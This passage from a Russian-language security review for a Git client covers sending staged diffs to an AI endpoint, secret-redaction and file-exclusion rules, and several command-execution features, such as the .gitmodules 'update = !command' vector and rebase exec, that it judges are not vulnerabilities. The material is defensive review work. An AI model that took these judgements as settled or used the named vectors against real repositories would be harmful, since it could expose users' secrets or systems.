OpenAI-compatible endpoint. Без явного подтверждения, ограничения объёма и фильтрации это
может раскрыть секреты из репозитория или случайно отправить лишние файлы. API key не должен
попадать в `settings.properties`, prompt, Git log или UI.

**Что сделать:**
- [x] Отправлять только `git diff --cached`; unstaged/untracked — только через отдельную явную
      кнопку `WORKTREE`, не по умолчанию.
- [x] Показывать endpoint, ветку, число staged-файлов и размер payload до отправки.
- [x] Ограничивать diff; исключать `.env`, credential/key-файлы и binary patches; редактировать
      явные секреты (assignment, bearer, известные форматы ключей, private-key blocks).
- [x] Внешние endpoint — только HTTPS; HTTP разрешён только для loopback и только при явной
      настройке. URL с userinfo отклоняется.
- [x] API key — отдельный `CredentialStore` (`ai-credentials.bin`/`.key`), не в settings/prompt/log.
- [x] Таймаут, отмена HTTP future и ограниченный ответ; diff трактуется как недоверенные данные,
      ответ санитизируется до одной короткой строки; авто-commit отсутствует.
- [x] Тесты: `CommitMessageGeneratorTest` 8/8 (фильтрация/redaction, prompt, парсинг, endpoint
      rules, fake local server, timeout), `AppSettingsTest` 12/12.

**Остаточный риск:** провайдер видит оставшийся staged diff; redaction — best-effort, а не
гарантия. Пользователь должен доверять endpoint. Cloud-прокси с общим ключом не делаем: только
per-user токен, квоты и rate limiting в отдельном этапе 1.2. Реальный внешний провайдер не
проверялся; UI не прокликивался.

---

## Что сознательно не считать уязвимостью

- **`.gitmodules update = !command`** — не работает в современном Git: значение отклоняется, custom command не копируется в `.git/config`. Проверено на 2.56; документация Git подтверждает. Это false positive, не добавлять в релизные заметки как RCE.
- **Bisect automation** запускает пользовательскую shell-команду намеренно; это фича, а не injection. Нужно предупреждение, но не удаление.
- **Rebase `exec`** — стандартная возможность interactive rebase; выполняется по явному плану пользователя.
- **Raw Git console** — намеренно принимает произвольные аргументы; это escape hatch.
- **`credentialHelper`** — произвольная команда по замыслу; опасность в хранении секрета, а не в самом факте запуска.
- **`CredentialStore` с ключом рядом** — задокументированное ограничение; не remote vulnerability, но надо честно писать модель угроз.
- **GitInstaller elevation** — ожидаемое системное подтверждение установки, не скрытый privilege escalation.

---

## Ограничения ревью

- Статический анализ, без фаззинга и полноценного динамического pen-test.
- Проверки выполнения — на Windows и Git for Windows 2.56; Unix-symlink сценарии требуют отдельного прогона.
- Hooks UI не открывался и не прокликивался; проверены код и focused-тесты, но не визуальное поведение.
- `build` и focused-тесты Hooks проходили до ревью; после создания этого файла код не менялся.
- Репозиторий не является git-репозиторием; коммитов и чистой точки сравнения нет.

## Definition of Done для всего трека

- [ ] Все P0 и P1 закрыты.
- [ ] Каждый P2 либо закрыт, либо помечен **accepted risk** с причиной.
- [ ] Для каждого исправления есть regression test или описанная ручная проверка.
- [ ] `./kotlin.bat build` проходит.
- [ ] Нет новых предупреждений/падений в затронутых сценариях.
- [ ] README/TODO отражают изменения модели угроз.
